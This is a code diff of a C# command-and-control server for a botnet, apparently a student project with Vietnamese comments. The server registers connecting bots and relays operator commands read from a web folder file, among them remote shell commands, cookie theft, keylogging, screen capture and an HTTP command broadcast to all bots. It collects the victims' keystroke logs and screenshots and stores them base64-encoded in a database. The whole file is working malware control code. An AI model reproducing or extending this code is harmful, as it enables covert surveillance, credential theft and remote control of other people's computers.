@@ -19,15 +19,9 @@ using System.Windows.Forms;
 
 namespace Server
 {
-    // Sửa lỗi khi đóng client thì web ko hiển thị client
-    //Sửa lỗi nhập cùng một dòng lệnh
-
-
     internal class Program
     {
         static Dictionary<TcpClient, string> clients = new Dictionary<TcpClient, string>();
-
-        //static string ip = "192.168.1.103";
         static int PORT_NUMBER = 9669;
         private const int BUFFER_SIZE = 1024;
         static ASCIIEncoding encoding = new ASCIIEncoding();
@@ -61,9 +55,8 @@ namespace Server
             {
                 TcpClient tcplient = listener.AcceptTcpClient();
                 Console.WriteLine("Connection received from " + tcplient.Client.RemoteEndPoint);
-                AddBot.addNewBot(tcplient);
+                DB.addNewBot(tcplient);
                 string clientName = ((IPEndPoint)tcplient.Client.RemoteEndPoint).ToString();
-                //
                 bool hasConnect = false;
                 foreach (var pair in clients)
                 {
@@ -75,24 +68,28 @@ namespace Server
                 if(!hasConnect)
                 {
                      clients.Add(tcplient, clientName);  
+                }
+                // moi them doan ni
+                else
+                {
+                    for (int i = 0; i < clients.Count; i++)
+                    {
+                        if (clients.Values.ElementAt(i) == clientName)
+                        {
+                            clients.Remove(clients.Keys.ElementAt(i));
+                            clients.Add(tcplient, clientName);
+                            break;
+                        }
+                    }
                 }    
-         
-                
+                //
+
             }
         }
         public static void handleControlBot(TcpListener listener)
         {
             while (true)
             {
-                System.Threading.Thread.Sleep(5);
-
-                //foreach (var pair in clients)
-                //{
-                //    Console.WriteLine(pair.Key.Client.RemoteEndPoint.ToString());
-                //}
-
-                checkConnected();
-
 
                 string filePathBotActive = "D:\\xampp\\htdocs\\PBL4\\php\\botActive.txt";
                 string filePathCommandBot = "D:\\xampp\\htdocs\\PBL4\\php\\commandBot.txt";
@@ -119,9 +116,6 @@ namespace Server
                 string command = commandBot[0];
                 string detail = commandBot[1];
 
-                //command: nocmd / getcmd/ getcookie/ getkeylogger/ getcapture
-                //detail: dir,.../link / start keylogger, stop keylogger/ start capture, stop capture/
-                //else continue
                 if (command == "http")
                 {
                     handleCommandAllClients(command, detail);
@@ -139,9 +133,6 @@ namespace Server
                     }
                 }
 
-
-
-                // Xong ctr xóa dl luôn file commandBot
                 StreamWriter sw = new StreamWriter(filePathCommandBot, false);
                 sw.Write("");
                 sw.Close();
@@ -180,8 +171,7 @@ namespace Server
                     receiveFileSocket(clientSelected, "cmd");
                     readFileAndInsertDB(clientSelected, id, "cmd", detail);
                     isFinished = true;
-                    //
-                    //Console.WriteLine(detail);
+
                 }
                 else if (command == "getcapture")
                 {
@@ -191,8 +181,7 @@ namespace Server
                     receiveFileSocket(clientSelected, "capture");
                     readFileAndInsertDB(clientSelected, id, "capture", detail);
                     isFinished = true;
-                    //
-                    //Console.WriteLine(detail);
+
                 }
                 else if (command == "getkeylogger")
                 {
@@ -227,7 +216,6 @@ namespace Server
             }
             else
             {
-                // viết lại file command Active
                 DB.resetCommandBot();
             }    
 
@@ -406,7 +394,7 @@ namespace Server
             }
             else if (type == "keylogger")
             {
-                //Console.WriteLine("Nhan file thanh cong");
+
                 fileName = ip + "-getkeylogger.txt";
             }
             else if (type == "cmd")
@@ -460,7 +448,6 @@ namespace Server
             }
             else if (type == "keylogger")
             {
-                //Console.WriteLine("Doc file thanh cong");
                 fileName = ip + "-getkeylogger.txt";
             }
             else if (type == "cmd")
@@ -491,7 +478,6 @@ namespace Server
             }
             if (type == "capture")
             {
-
                 string base64Img = convertToBase64(fileName);
                 DB.insertDB(id, type, detail, base64Img);
             }
@@ -505,49 +491,14 @@ namespace Server
         {
             Bitmap image = new Bitmap(path);
 
-            // Convert the image to a byte array
             byte[] imageBytes;
             using (MemoryStream ms = new MemoryStream())
             {
                 image.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                 imageBytes = ms.ToArray();
             }
-
-            // Encode the byte array to Base64
             string base64String = Convert.ToBase64String(imageBytes);
-            // Console.WriteLine(base64String);
             return base64String;
-        }
-        static bool IsConnected(Socket s)
-        {
-            try
-            {
-                // Sử dụng poll để kiểm tra trạng thái của kết nối
-        //        return !(socket.Poll(1, SelectMode.SelectRead) && socket.Available == 0);
-
-                return !((s.Poll(1000, SelectMode.SelectRead) && (s.Available == 0)) || !s.Connected);
-            }
-            catch (SocketException) { return false; }
-        }
-        static void checkConnected()
-        {
-            for (int i = 0; i < clients.Count; i++)
-            {
-                if (IsConnected(clients.Keys.ElementAt(i).Client))
-                {
-                    //Console.WriteLine("Dang ket noi");
-                }
-                else
-                {
-                    DB.resetStatusBotByIpAndPort(clients.Keys.ElementAt(i).Client.RemoteEndPoint.ToString());
-                    clients.Remove(clients.Keys.ElementAt(i));
-                    i--;
-                    Console.WriteLine("Mat ket noi");
-                }
-            }
-           
-               
-                
         }
         static string GetLastIPv4Address()
         {
@@ -602,13 +553,8 @@ namespace Server
             }
             catch (Exception ex)
             {
-
-                //Console.WriteLine("Error: " + ex);
             }
         }
-        //static void Main()
-        //{
-        //    Console.WriteLine(DB.getIdByIpAndPort("192.168.1.100", "5454"));
-        //}
+
     }
 }
